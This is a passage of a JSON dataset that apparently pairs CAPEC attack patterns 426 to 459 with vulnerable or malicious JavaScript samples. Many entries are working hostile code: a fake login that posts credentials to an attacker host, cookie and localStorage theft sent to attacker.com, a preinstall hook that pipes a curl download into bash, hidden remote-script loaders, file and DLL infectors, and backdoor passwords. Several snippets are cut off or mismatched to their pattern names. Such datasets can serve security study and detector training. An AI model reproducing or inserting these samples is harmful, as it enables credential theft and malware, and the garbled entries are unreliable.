        "description": "\"This code demonstrates vulnerabilities related to social engineering through UI misrepresentation and weak security implementations. It includes single-factor authentication, misleading UI elements, improper destination verification, weak encryption negotiation, and unsecured communication channels. The code is designed to appear trustworthy while containing multiple security weaknesses that could be exploited through social engineering.\""
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "function processPayment(userId, amount) {\n  const userReputationScore = getUserReputation(userId);\n  \n  if (userReputationScore > 100) {\n    // Blindly trust high reputation users\n    processInstantTransfer({\n      userId: userId,\n      amount: amount,\n      destination: getDestinationFromUser(userId)\n    });\n    \n    // Offer special bonus for large transactions\n    if (amount > 10000) {\n      const bonus = amount * 0.1;\n      sendBonus(userId, bonus);\n      \n      // Create promotional message\n      for (let i = 0; i < amount; i++) {\n        notifyNetwork(userId + ' made a large transaction!');\n      }\n    }\n  }\n}",
        "description": "This vulnerable code demonstrates social engineering through financial incentivization, combining multiple weaknesses: it relies solely on a reputation score for security decisions (CWE-654), creates excessive resource consumption through unbounded notifications (CWE-405), doesn't properly validate transaction destinations (CWE-941), and assumes high-reputation users can be trusted (CWE-656). The code creates emergent attack vectors through its bonus system and notification mechanism (CWE-1229)."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "function authenticateUser(userId, authToken) {\n    // Simple UI to influence user behavior\n    const loginPrompt = document.createElement('div');\n    loginPrompt.innerHTML = `\n        <div class='trusted-login-box'>\n            <img src='https://attacker-controlled.com/bank-logo.png' />\n            <h2>Secure Login Required</h2>\n            <p>Your session needs to be verified for security purposes.</p>\n            <input type='text' id='username' placeholder='Username' />\n            <input type='password' id='password' placeholder='Password' />\n            <button onclick='submitCredentials()'>Verify Identity</button>\n        </div>\n    `;\n    document.body.appendChild(loginPrompt);\n    \n    function submitCredentials() {\n        const credentials = {\n            username: document.getElementById('username').value,\n            password: document.getElementById('password').value\n        };\n        // Send credentials to attacker's server\n        fetch('https://attacker-controlled.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(credentials)\n        });\n        // Show success message to maintain illusion\n        loginPrompt.innerHTML = '<p>Verification successful!</p>';\n    }\n}",
        "description": "This code demonstrates social engineering through UI manipulation. It creates a deceptive login prompt that appears trustworthy but actually sends credentials to an attacker. It relies on a single factor authentication, displays truncated security information, and exploits user trust through behavioral psychology. The code reflects CWE-205 by presenting misleading behavior, CWE-673 by allowing external control of the security boundary, CWE-654 through single-factor reliance, and CWE-222 by obscuring the true nature of the credential collection."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "class ChatSession {\n  constructor() {\n    this.messagePatterns = {};\n    this.trustedOrigins = [];\n  }\n\n  adaptCommunicationStyle(message) {\n    let pattern = this.analyzePattern(message);\n    this.messagePatterns[message.userId] = pattern;\n    return true;\n  }\n\n  establishConnection(origin, userId) {\n    // Vulnerable: Does not properly verify origin\n    this.trustedOrigins.push(origin);\n    return new WebSocket(origin);\n  }\n\n  handleIncomingMessage(message, origin) {\n    if(this.messagePatterns[message.userId]) {\n      // Vulnerable: Automatically mirrors communication style\n      let response = this.generateMatchingResponse(message);\n      // Vulnerable: No verification of channel integrity\n      this.sendResponse(response, origin);\n    }\n  }\n\n  generateMatchingResponse(message) {\n    // Vulnerable: Mirrors user's communication patterns without validation\n    return {\n      content: message.content,\n      style: this.messagePatterns[message.userId],\n      userId: message.userId\n    };\n  }\n}",
        "description": "A vulnerable chat system that demonstrates social engineering through communication pattern matching. The code mimics user communication patterns without proper validation, allowing potential attackers to manipulate the system's responses. It lacks proper endpoint verification, enables reflection attacks, and creates emergent communication channels that can be exploited for social engineering."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "const trackUserBehavior = () => {\n  let eyeMovements = [];\n  let lastX = 0, lastY = 0;\n  \n  document.addEventListener('mousemove', (e) => {\n    if (Math.abs(e.clientX - lastX) > 50 || Math.abs(e.clientY - lastY) > 50) {\n      eyeMovements.push({\n        x: e.clientX,\n        y: e.clientY,\n        timestamp: Date.now(),\n        element: document.elementFromPoint(e.clientX, e.clientY)?.id || 'unknown'\n      });\n      \n      if (eyeMovements.length > 10) {\n        fetch('/analytics', {\n          method: 'POST',\n          body: JSON.stringify({\n            movements: eyeMovements,\n            userAgent: navigator.userAgent,\n            sessionId: document.cookie.match(/sessionId=([^;]+)/)?.[1]\n          })\n        });\n        eyeMovements = [];\n      }\n    }\n    lastX = e.clientX;\n    lastY = e.clientY;\n  });\n};\n\ntrackUserBehavior();",
        "description": "This code tracks user mouse movements as a proxy for eye movements, collecting behavioral data about which elements users look at and for how long. It stores this sensitive information and sends it to a server, potentially revealing user interaction patterns and focus points that could be used to infer password entry, security question responses, or other confidential information through behavioral analysis."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "// Vulnerable server-side JavaScript code\nconst debugLogger = require('debug')('app:debug');\nconst express = require('express');\nconst app = express();\n\napp.get('/api/user/:id', (req, res) => {\n  const sensitiveData = {\n    id: req.params.id,\n    ssn: '123-45-6789',\n    creditCard: '4111-1111-1111-1111',\n    password: 'hashedPassword123'\n  };\n\n  // Excessive debug logging of sensitive information\n  debugLogger('Processing user request:', JSON.stringify(sensitiveData));\n  console.log('User data accessed:', sensitiveData);\n\n  // Intentionally slow operation to make timing attack possible\n  for(let i = 0; i < sensitiveData.password.length; i++) {\n    let temp = sensitiveData.password.charCodeAt(i);\n    // Artificial delay based on character value\n    for(let j = 0; j < temp; j++) {\n      temp = temp * 1.1;\n    }\n  }\n\n  res.json({ id: sensitiveData.id });\n});",
        "description": "This code demonstrates multiple security vulnerabilities including excessive logging of sensitive information, exposure through debug logs, and potential timing side-channel attacks through transient execution. The code logs sensitive data including SSN and credit card numbers, and contains an intentionally slow operation that could be exploited through timing analysis."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "`\nfunction processTemplate(userTemplate, userData) {\n    const errorLog = [];\n    try {\n        // No validation of template syntax\n        const compiledTemplate = eval('`' + userTemplate + '`');\n        \n        // Error page displays raw error details\n        if (!userData) {\n            throw new Error('Database connection failed: mysql://user:password123@localhost:3306/userdb');",
        "description": "\"Vulnerable code that combines improper template syntax validation, exposure of sensitive information in error messages, and lack of proper input sanitization. It uses eval() for template processing, exposes database credentials in errors, and doesn't escape user input in error pages.\""
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "let userInput = request.getParameter('message');\nlet logFile = 'debug.log';\nlet captcha = '1234';\n\nfunction processMessage(input) {\n    // Vulnerable quote handling\n    let sql = 'INSERT INTO messages VALUES (\"' + input + '\")';\n    \n    // Debug logging with sensitive information\n    fs.appendFileSync(logFile, 'User input: ' + input + '\\n');\n    fs.appendFileSync(logFile, 'SQL Query: ' + sql + '\\n');\n    \n    // Simple guessable CAPTCHA\n    if(input.includes('captcha=' + captcha)) {\n        return true;\n    }\n    return false;\n}",
        "description": "The code demonstrates multiple vulnerabilities including improper quote neutralization in SQL queries, debug logging of sensitive information, and a weak CAPTCHA implementation. The code fails to validate input syntax and directly incorporates user input into SQL queries without proper sanitization. It also writes sensitive information to debug logs and uses a static, easily guessable CAPTCHA value."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "function sendSubconsciousMessage(message, target) {\n  const targetBuffer = new Array(50);\n  const hiddenCommand = btoa(message);\n  const messagePattern = `Hello ${target}, how are you? ${hiddenCommand}`;\n  \n  // Vulnerable buffer copying without size check\n  for(let i = 0; i < messagePattern.length; i++) {\n    targetBuffer[i] = messagePattern[i];\n  }\n  \n  // Send message over unsecured channel\n  const socket = new WebSocket('ws://messagingserver.com');\n  socket.onopen = () => {\n    socket.send(targetBuffer.join(''));\n  };\n  \n  // Process embedded commands without validation\n  const embeddedCommand = messagePattern.split(' ').map(word => {\n    return word.length > 10 ? atob(word) : word;\n  }).join('');\n  \n  return embeddedCommand;\n}",
        "description": "This code demonstrates vulnerable message handling by embedding hidden commands within normal communication, using unsafe buffer operations and cleartext transmission. It includes buffer overflows, improper message integrity checks, and unsecured data transmission."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const users = {\n    'alice': { attempts: 0, locked: false },\n    'bob': { attempts: 0, locked: false }\n};\n\nasync function login(username, password) {\n    if (!users[username]) {\n        return { success: false, message: 'User not found' };\n    }\n\n    if (users[username].locked) {\n        return { success: false, message: 'Account is locked' };\n    }\n\n    const isValid = await checkPassword(password);\n    \n    if (!isValid) {\n        users[username].attempts++;\n        if (users[username].attempts >= 3) {\n            users[username].locked = true;\n        }\n        return { success: false, message: 'Invalid password' };\n    }\n\n    return { success: true, message: 'Login successful' };\n}\n\nasync function checkPassword(password) {\n    // Simulated password check with timing variation\n    const delay = password.length * 100;\n    await new Promise(resolve => setTimeout(resolve, delay));\n    return false;\n}",
        "description": "This code demonstrates multiple security vulnerabilities including timing attacks (CWE-208), information exposure through error messages (CWE-202), and observable behavioral discrepancies (CWE-205). The login system reveals different responses based on whether a user exists, leaks information through timing variations in password checking, and exposes the account lockout status. An attacker can use these discrepancies to enumerate valid usernames and potentially determine password length through timing analysis."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "`\n    // Vulnerable WebSocket server implementation\n    const WebSocket = require('ws');\n    const wss = new WebSocket.Server({ port: 8080",
        "description": "\"A vulnerable WebSocket implementation that demonstrates multiple communication channel security issues: lack of endpoint verification, no proper authentication, blind trust in message sources, and observable behavioral differences in responses. The server accepts connections without verifying origins, allows arbitrary clients to send messages to any other client, and exposes internal state through error messages.\""
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "// Manufacturing system control interface\nconst manufacturingSystem = {\n  components: [],\n  trustedVendors: ['vendor1', 'vendor2'],\n\n  addComponent: function(component, vendor) {\n    // No verification of component authenticity or vendor trustworthiness\n    if (component.firmware) {\n      // Firmware binary is accepted without validation\n      this.components.push({\n        id: component.id,\n        firmware: component.firmware,\n        vendor: vendor,\n        configStatus: 'development'\n      });\n    }\n  },\n\n  releaseProduct: function() {\n    let finalProduct = {};\n    this.components.forEach(component => {\n      // Components are assembled without validation\n      // Development configurations remain in released product\n      finalProduct[component.id] = component;\n    });\n    return finalProduct;\n  },\n\n  updateComponent: function(componentId, update) {\n    // No mechanism to verify update authenticity\n    // Some components may not support updates at all\n    const component = this.components.find(c => c.id === componentId);\n    if (component && update) {\n      Object.assign(component, update);\n    }\n  }\n};",
        "description": "This code demonstrates vulnerabilities in a manufacturing system control interface that allows manipulation during the manufacturing process. It shows insufficient validation of components and vendors, lack of security controls for firmware, release of products with development configurations, and problematic update mechanisms, representing supply chain attack vectors."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "// Third-party package installation and integration\nconst config = {\n    apiKey: 'production_key_123',\n    debugMode: true,\n    adminPassword: 'default_admin_pass',\n    developmentServer: 'http://internal-dev.company.com'\n};\n\nconst thirdPartyLib = require('untrusted-package@1.0.0');\n\nfunction initializeProduct() {\n    // Expose internal configuration\n    global.systemConfig = config;\n    \n    // Use potentially compromised third-party code\n    thirdPartyLib.initialize({\n        credentials: config,\n        allowRemoteAccess: true,\n        bypassAuth: true\n    });\n    \n    // Debug logging in production\n    console.log('System initialized with config:', config);\n}\n\n// Different behavior in production vs development\nif (process.env.NODE_ENV === 'production') {\n    initializeProduct();\n    // Keep development endpoints active\n    require('./debug-endpoints.js');\n}",
        "description": "This code demonstrates multiple supply chain vulnerabilities including exposure of sensitive configuration in production, reliance on an untrusted third-party package with a fixed version, debug features enabled in production, and observable behavioral differences between environments. The code maintains development configurations and debugging capabilities in production builds, potentially exposing internal system details to unauthorized actors."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "`\nclass HardwareController {\n  constructor() {\n    this.firmwareVersion = '2.0.0';\n    this.securityVersion = 1000;\n    this.redundancyMode = true;\n    this.voltage = 3.3;",
        "description": "\"This code demonstrates vulnerable hardware control implementation allowing unauthorized firmware downgrades, component modifications, voltage manipulation, and redundancy mode changes without proper authentication or validation. The system lacks protection against version rollbacks, voltage glitches, and unauthorized component alterations, making it susceptible to malicious maintenance modifications.\""
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function initializePhotoFrame() {\n    const malwarePayload = `\n        (function() {\n            const files = fs.readdirSync('/');\n            files.forEach(file => {\n                if (file.endsWith('.jpg')) {\n                    const infected = fs.readFileSync(file);\n                    fs.writeFileSync(file, Buffer.concat([infected, malwarePayload]));\n                }\n            });\n            // Connect to C&C server\n            const ws = new WebSocket('ws://malicious-server.com');\n            ws.onopen = () => {\n                // Send system info\n                ws.send(JSON.stringify({\n                    type: 'system_info',\n                    data: {\n                        os: process.platform,\n                        hostname: require('os').hostname(),\n                        username: process.env.USERNAME\n                    }\n                }));\n            };\n        })();\n    `;\n    \n    // Hide malware in legitimate photo frame functionality\n    document.getElementById('photoframe').addEventListener('load', () => {\n        eval(atob(malwarePayload));\n    });\n}",
        "description": "This code represents a malicious implementation for a digital photo frame that contains hidden functionality to replicate itself across image files and establish communication with a command & control server. It demonstrates improper access control (CWE-284), embedded malicious code (CWE-506), and replicating behavior (CWE-509). The malware is triggered through a legitimate-looking photo frame initialization function."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "const benignFunction = (input) => {\n    // Legitimate looking function\n    console.log('Processing:', input);\n    \n    // Hidden malicious payload\n    ((p)=>{\n        const x = new XMLHttpRequest();\n        x.open('POST', 'https://attacker.com/collect');\n        x.send(JSON.stringify({\n            cookies: document.cookie,\n            localStorage: localStorage,\n            input: p\n        }));\n    })(input);\n    \n    // Continue with normal operation\n    return input.toUpperCase();\n}",
        "description": "A seemingly benign function that processes input data, but secretly contains embedded malicious code that steals sensitive browser data and sends it to an attacker-controlled server. The malicious code is hidden between legitimate operations to avoid detection."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "// Seemingly innocent utility function for image processing\nfunction processImage(imageData) {\n    // Hidden malicious payload that activates under specific conditions\n    if (new Date().getMonth() === 11) {\n        // Create a hidden iframe to execute malicious code\n        let hiddenFrame = document.createElement('iframe');\n        hiddenFrame.style.display = 'none';\n        document.body.appendChild(hiddenFrame);\n        \n        // Download and execute remote code without verification\n        let script = hiddenFrame.contentDocument.createElement('script');\n        script.src = 'https://malicious-cdn.evil/payload.js';\n        hiddenFrame.contentDocument.body.appendChild(script);\n        \n        // Modify system permissions stealthily\n        localStorage.setItem('adminControls', JSON.stringify({\n            securityLevel: 'disabled',\n            allowRemoteExecution: true,\n            bypassChecks: true\n        }));\n    }\n    return imageData; // Return normal result to avoid detection\n}",
        "description": "A malicious developer has embedded a backdoor in an image processing utility function. The code creates emergent resources (hidden iframe), downloads and executes remote code without verification, and manipulates security settings. The malicious behavior only triggers in December to avoid detection during testing."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "// Malicious code disguised as a security function\nfunction validateUserAccess(userId) {\n  let isValid = false;\n  \n  try {\n    // Legitimate-looking validation\n    isValid = checkUserCredentials(userId);\n    \n    // Hidden malicious payload that activates after a specific date\n    if (new Date() > new Date('2024-12-31')) {\n      // Secretly send system info to attacker's server\n      fetch('https://attacker-controlled.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({\n          systemInfo: window.navigator.userAgent,\n          localStorage: window.localStorage,\n          cookies: document.cookie\n        })\n      });\n      \n      // Deliberately weaken security checks\n      isValid = true;\n    }\n  } catch(e) {\n    // Suppress errors to avoid detection\n    isValid = true;\n  }\n  \n  return isValid;\n}",
        "description": "This code demonstrates a maliciously modified security validation function that appears legitimate but contains hidden behavior. After a specific date, it leaks sensitive system information and bypasses security checks. The code is designed to survive compiler optimizations and appears as a normal security function, making it difficult to detect during code review."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "// Malicious package config file (package.json)\n{\n  \"name\": \"legitimate-package\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"preinstall\": \"node -e 'require(\\\"child_process\\\").exec(\\\"/bin/bash -c \\\\\"curl -s http://malicious.com/backdoor | bash\\\\\"\\\")';\"\n  },\n  \"dependencies\": {\n    \"trusted-lib\": \"^2.0.0\"\n  }\n}\n\n// Compromised update mechanism\nconst updateSystem = {\n  checkForUpdates: function() {\n    fetch('http://update-server.com/latest')\n      .then(response => response.json())\n      .then(data => {\n        eval(data.code); // Executing downloaded code without verification\n        require(data.package); // Loading untrusted package\n      });\n  }\n};",
        "description": "This code demonstrates a compromised package configuration and update system that allows execution of malicious code through npm scripts and dynamic code loading. It includes unverified remote code execution, unsafe dynamic requires, and preinstall scripts that can execute arbitrary commands during package installation."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "// Dependencies in package.json\n{\n  \"dependencies\": {\n    \"legacy-crypto\": \"1.0.0\",\n    \"unverified-logger\": \"^0.1.0\",\n    \"suspicious-analytics\": \"latest\"\n  }\n}\n\n// Application code\nconst legacyCrypto = require('legacy-crypto');\nconst logger = require('unverified-logger');\nconst analytics = require('suspicious-analytics');\n\nfunction processUserData(userData) {\n    // Using unverified third-party components\n    const encryptedData = legacyCrypto.encrypt(userData);\n    logger.log(userData.email);\n    \n    // Loading remote code dynamically\n    const remoteScript = analytics.loadScript('http://analytics-cdn.example.com/tracker.js');\n    eval(remoteScript);\n    \n    return encryptedData;\n}",
        "description": "This code demonstrates vulnerable supply chain practices by using unverified third-party dependencies, including a legacy crypto library with known vulnerabilities, an unverified logger, and a suspicious analytics package that loads and executes remote code. The code blindly trusts and executes external components without proper verification or security controls."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "class SecuritySystem {\n  constructor() {\n    this.isAdmin = false;\n    this.securityChecks = true;\n  }\n\n  // Deliberately flawed design where critical security checks can be bypassed\n  authenticate(username, password) {\n    if (this.securityChecks) {\n      // Security check can be disabled by optimizing out the condition\n      if (process.env.NODE_ENV === 'production') {\n        return this.validateCredentials(username, password);\n      }\n    }\n    // Fallback that bypasses security\n    return true;\n  }\n\n  validateCredentials(username, password) {\n    // Critical security validation implemented client-side\n    if (username === 'admin' && password === 'password123') {\n      this.isAdmin = true;\n      return true;\n    }\n    return false;\n  }\n\n  getSystemInfo() {\n    const systemInfo = {\n      securityLevel: process.env.SECURITY_LEVEL,\n      databaseUrl: process.env.DB_CONNECTION,\n      secretKey: process.env.SECRET_KEY\n    };\n    return systemInfo;\n  }\n}",
        "description": "This code demonstrates multiple design flaws: security checks that can be removed through optimization, exposure of sensitive system information, client-side security enforcement, and violation of secure design principles. The authentication mechanism can be bypassed, sensitive information is directly exposed, and critical security checks are implemented client-side where they can be manipulated."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "// Malicious DLL-like module with hidden payload\nconst moduleLoader = {\n    paths: process.env.PATH.split(':'),\n    loadedModules: new Map(),\n    \n    loadModule: function(moduleName) {\n        // Search for module in untrusted paths\n        for(let path of this.paths) {\n            try {\n                // Attempt to load potentially tampered module\n                const module = require(`${path}/${moduleName}`);\n                \n                // Hidden payload in memory padding\n                const payload = Buffer.from('malicious_bytes').toString('base64');\n                const paddedMemory = new ArrayBuffer(1024);\n                const view = new DataView(paddedMemory);\n                \n                // Inject payload into padding gaps\n                for(let i = 0; i < payload.length; i++) {\n                    view.setUint8(i * 16, payload.charCodeAt(i));\n                }\n                \n                // Self-replication attempt\n                const fs = require('fs');\n                fs.readdir('.', (err, files) => {\n                    files.forEach(file => {\n                        if(file.endsWith('.js')) {\n                            fs.appendFileSync(file, payload);\n                        }\n                    });\n                });\n                \n                this.loadedModules.set(moduleName, module);\n                return module;\n            } catch(e) {\n                continue;\n            }\n        }\n    }\n};",
        "description": "This code demonstrates a malicious module loader that exploits untrusted search paths and memory padding to inject and replicate malicious code. It searches for modules in untrusted paths, injects a payload into memory padding gaps, and attempts to self-replicate by infecting other JavaScript files in the directory. The code also exposes sensitive system information through directory traversal."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "// Appears as a legitimate file utility\nclass FileUtility {\n  constructor() {\n    this.version = '1.0';\n    this.infected = false;\n  }\n\n  async processFile(filename) {\n    try {\n      // Hidden malicious functionality\n      if (!this.infected && filename.includes('AUX') || filename.includes('CON')) {\n        await this.injectPayload();\n        this.infected = true;\n      }\n      return `Processing ${filename}`;\n    } catch (e) {\n      return 'Error processing file';\n    }\n  }\n\n  async injectPayload() {\n    // Non-ubiquitous API call that may not exist in all environments\n    if (typeof window.MSStreamReader !== 'undefined') {\n      const payload = atob('bWFsaWNpb3VzX2NvZGU=');\n      eval(payload); // Execute hidden malicious code\n    }\n  }\n\n  // Firmware update functionality deliberately omitted\n}",
        "description": "This code demonstrates a malicious file utility that appears legitimate but contains hidden functionality. It exploits Windows device names (AUX/CON), uses non-ubiquitous APIs, and includes embedded malicious code that activates under specific conditions. The code also deliberately lacks firmware update capabilities, making it difficult to patch vulnerabilities."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const loadCustomDLL = (userProvidedPath) => {\n  const dllPath = userProvidedPath || 'system32/helper.dll';\n  const fs = require('fs');\n  \n  if (fs.existsSync(dllPath)) {\n    const originalDLL = fs.readFileSync(dllPath);\n    const maliciousPayload = Buffer.from('virus_payload_here');\n    \n    const infectedDLL = Buffer.concat([originalDLL, maliciousPayload]);\n    \n    fs.writeFileSync(dllPath.replace('.dll', '_modified.dll'), infectedDLL);\n    \n    // Replicate to other DLLs in the system\n    const systemDLLs = fs.readdirSync('C:/Windows/System32').filter(f => f.endsWith('.dll'));\n    systemDLLs.forEach(dll => {\n      try {\n        fs.writeFileSync(`C:/Windows/System32/${dll}`, infectedDLL);\n      } catch {}\n    });\n  }\n};",
        "description": "This code demonstrates embedding malicious code into DLL files, leveraging untrusted search paths and improper handling of Windows device names. It includes virus replication functionality that attempts to spread to other system DLLs once executed."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "function checkUserAccess(username) {\n  // Hidden malicious code disguised as security check\n  const innocentLookingAPI = window.legacyAuthCheck || window.modernAuthCheck;\n  \n  // Trojan functionality hidden in authentication logic\n  if (innocentLookingAPI(username)) {\n    // Appears to do normal authentication\n    console.log('User authenticated');\n    // But secretly sends user data to attacker\n    const hiddenBeacon = new Image();\n    hiddenBeacon.src = 'https://malicious-server.com/collect?data=' + encodeURIComponent(username);\n    return true;\n  }\n  return false;\n}",
        "description": "Code appears to be a legitimate authentication function but contains hidden malicious functionality that exfiltrates user data. It relies on non-standard APIs that may not exist across all platforms and includes a trojan component disguised as normal authentication logic."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "// Hidden malicious code disguised as a system utility\nclass SystemMonitor {\n    constructor() {\n        this.isActive = false;\n        this.debugMode = false;\n        this.infectedSystems = new Set();\n    }\n\n    start() {\n        this.isActive = true;\n        this.debugMode = true;\n        this.registerHook();\n        setInterval(() => this.replicateAndInfect(), 3000);\n    }\n\n    registerHook() {\n        const originalWrite = process.stdout.write;\n        process.stdout.write = function(data) {\n            // Intercept and modify system output\n            const modified = data.toString().replace(/password/gi, '********');\n            originalWrite.call(process.stdout, modified + '\\n');\n        }\n    }\n\n    replicateAndInfect() {\n        if (!this.isActive) return;\n        \n        // Simulate voltage glitch attack\n        const memoryRegister = 0xFFFF;\n        this.writeToRegister(memoryRegister, 0x1);\n        \n        // Spread to other systems\n        const networks = this.scanNetwork();\n        networks.forEach(network => {\n            if (!this.infectedSystems.has(network)) {\n                this.infectedSystems.add(network);\n                this.injectPayload(network);\n            }\n        });\n    }\n\n    writeToRegister(address, value) {\n        // Simulate direct hardware register manipulation\n        const buffer = new ArrayBuffer(4);\n        new DataView(buffer).setInt32(0, value);\n        return buffer;\n    }\n\n    scanNetwork() {\n        return ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n    }\n\n    injectPayload(target) {\n        // Simulate malware injection\n        console.log(`System compromised: ${target}`);\n    }\n}\n\n// Initialize and activate silently\nconst monitor = new SystemMonitor();\nmonitor.start();",
        "description": "A malicious code implementation that demonstrates hardware-level manipulation and self-replication capabilities. It includes features for register manipulation, voltage glitch simulation, debug mode exploitation, and network propagation. The code masquerades as a legitimate system monitoring utility while performing unauthorized operations and spreading to other systems."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "function networkDevice() {\n  let authToken = null;\n  \n  function authenticate(token) {\n    // Vulnerable: stores authentication token without protection\n    authToken = token;\n  }\n  \n  function processPacket(packet) {\n    // Vulnerable: No timestamp/nonce validation for replay attacks\n    if (packet.token === authToken) {\n      // Malicious code embedded in device firmware\n      if (packet.command === 'update') {\n        let maliciousCode = packet.payload;\n        eval(maliciousCode); // Executes arbitrary code\n        \n        // Inject errors into redundant systems\n        disableBackupSystems();\n      }\n      return true;\n    }\n    return false;\n  }\n  \n  function disableBackupSystems() {\n    // Deliberately corrupt redundancy mechanisms\n    backupSystem.status = 'degraded';\n    failoverEnabled = false;\n  }\n  \n  return { authenticate, processPacket };\n}",
        "description": "A vulnerable device firmware implementation that allows replay attacks, contains embedded malicious code, and can be exploited to compromise hardware redundancy systems through unauthorized modifications and authentication bypass"
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "// Hidden backdoor in a system component\nclass SecurityManager {\n  constructor() {\n    this.initialized = false;\n    // Hidden undocumented feature/backdoor\n    if (process.env.SPECIAL_KEY === 'xyz123') {\n      this.adminMode = true;\n    }\n  }\n\n  validateAccess(user) {\n    // Embedded malicious code that creates a hidden bypass\n    if (this.adminMode || user.token.includes('BYPASS_TOKEN')) {\n      return true;\n    }\n    return this.normalValidation(user);\n  }\n\n  normalValidation(user) {\n    // Normal validation logic\n    return user.isAuthenticated && user.hasValidPermissions;\n  }\n\n  // Non-updatable component with hardcoded security checks\n  get version() {\n    return '1.0.0'; // Cannot be updated due to hardware limitations\n  }\n}",
        "description": "This code demonstrates a security component with embedded malicious logic, including an undocumented backdoor feature and non-updatable security validations. It contains a hidden administrative mode triggered by an environment variable and a bypass mechanism in the access validation logic."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "class SecurityController {\n  constructor() {\n    this.isAdmin = false;\n    this.hiddenBackdoor = '31337';\n  }\n\n  authenticate(password) {\n    if (password === this.hiddenBackdoor) {\n      this.isAdmin = true;\n      this.injectMaliciousCode();\n      return true;\n    }\n    return false;\n  }\n\n  injectMaliciousCode() {\n    // Inject malicious code into system memory\n    eval('(function() { window.localStorage.clear(); window.sessionStorage.clear(); document.cookie = \"\"; })()');\n    // Disable system redundancy checks\n    this.bypassRedundancyChecks();\n  }\n\n  bypassRedundancyChecks() {\n    // Corrupt backup systems\n    this.backupSystem = null;\n    this.redundancyEnabled = false;\n  }\n}",
        "description": "This code implements a malicious backdoor in a security controller that allows unauthorized access and system manipulation. It contains embedded malicious logic that triggers data clearing operations and disables system redundancy when accessed using a hidden password."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "const memoryMap = new Map();\n\nfunction writeSecureMemory(address, value) {\n  memoryMap.set(address, value);\n  memoryMap.set(address + 0x1000, value); // Mirror region\n}\n\nfunction readMemory(address) {\n  if (address < 0x1000) {\n    throw new Error('Access denied');\n  }\n  return memoryMap.get(address);\n}\n\n// Attacker code\nwriteSecureMemory(0x500, 'sensitive_data');\n// Bypass protection by reading from mirrored region\nconst data = readMemory(0x1500);",
        "description": "This code demonstrates a vulnerability where protected memory regions are mirrored without proper access controls. While direct access to the original memory region (below 0x1000) is restricted, an attacker can access the same data through a mirrored region (original address + 0x1000). This simulates hardware memory aliasing vulnerabilities where overlapping memory ranges or mirrored regions lack consistent protection mechanisms."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "`\nconst usbDeviceHandler = {\n    init: function() {\n        this.data = [];\n        this.connectWifi();",
        "description": "\"This code demonstrates a malicious USB-based attack that automatically executes when loaded, captures keystrokes, scans the network, and exfiltrates sensitive data through an unencrypted wireless connection. It exploits unprotected hardware interfaces and transmits sensitive information in cleartext, making it vulnerable to sniffing.\""
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "`\n    // Malicious bootloader code masquerading as legitimate firmware update\n    class FirmwareUpdater {\n      constructor() {\n        this.originalBootloader = new Uint8Array(1024);\n        this.writeableMemory = new ArrayBuffer(8192);",
        "description": "\"A malicious firmware updater that exploits writable memory, bypasses secure boot, and injects malicious code into the boot sequence. It demonstrates vulnerabilities in firmware verification, bootloader protection, and secure memory access control.\""
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
